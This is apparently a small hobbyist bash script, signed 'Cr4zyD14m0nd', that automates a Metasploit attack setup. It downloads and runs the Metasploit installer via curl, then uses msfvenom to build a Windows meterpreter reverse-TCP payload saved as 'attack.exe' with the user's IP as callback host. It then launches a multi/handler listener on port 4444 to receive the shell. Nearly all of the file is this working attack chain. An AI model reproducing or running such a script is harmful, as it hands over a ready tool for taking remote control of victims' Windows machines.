#! /bin/bash

echo "##################################"
echo "#                                #"
echo "#     WELCOME                    #"
echo "#     By: Cr4zyD14m0nd           #"
echo "#                                #"
echo "##################################"
echo ""

apt-get install ifconfig
ifconfig
echo "Please enter your IP"
read IP
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
apt-get install apache2
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=$IP LPORT=4444 -o attack.exe
msfconsole -q -x " use multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $IP; set LPORT 4444; exploit;"

